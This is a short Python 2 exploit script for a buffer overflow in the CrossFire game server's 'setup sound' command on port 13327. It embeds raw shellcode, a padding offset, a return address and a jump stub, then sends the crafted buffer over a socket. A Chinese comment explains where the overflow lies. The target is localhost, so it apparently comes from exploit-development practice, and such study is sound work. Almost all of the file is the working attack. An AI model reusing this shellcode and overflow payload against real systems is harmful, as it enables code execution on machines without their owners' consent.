#!/usr/bin/python
#coding=utf-8
import socket

shellcode = ("\xba\xdc\x47\x84\xd0\xd9\xea\xd9\x74\x24\xf4\x5e\x29\xc9" +
"\xb1\x16\x31\x56\x12\x83\xc6\x04\x03\x8a\x49\x66\x25\x03" +
"\x8d\x35\x85\x30\x5b\xb8\x63\xd0\xc3\x25\xfa\xfd\x39\xd5" +
"\x6b\xbe\x93\xb0\xfb\x51\x48\x5b\xaf\xd8\x91\xc9\x29\x82" +
"\x01\x5f\xe0\xbb\x43\x92\x8c\x0b\xe5\xfc\x6e\xa6\x6a\xac" +
"\x22\x6e\x28\xd8\x22\x3e\xc8\x17\x24\xad\x7f\xaa\x7c\x61" +
"\x40\x67\xfe\xc8\xc6\x8e\x4f\xc1\x6a\x19\x9f\xfa\xf9\xb1" +
"\xb7\x2b\x9c\x28\x26\xba\x83\xf9\xe5\x35\xa2\x33\x89")

def main():
	host = '127.0.0.1'
	
	crash = shellcode + "A" * (4368 - 111) + "\x97\x45\x13\x08" + "\x83\xc0\x0c\xff\xe0\x90\x90"

	# 该缓冲区溢出存在于setup sound指令中，\x11为DC1设备控制1，后面nop加null表示指令完成
	buffer = "\x11(setup sound " + crash + "\x90\x00#"
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		print "[*]Sending evil buffer"
		s.connect((host, 13327))
		data = s.recv(1024)
		print data
		s.send(buffer)
		s.close()
		print "[*]Payload Sent!"
	except Exception as e:
		print "[-]Can't connect CrossFire!"
		print e

if __name__ == '__main__':
	main()
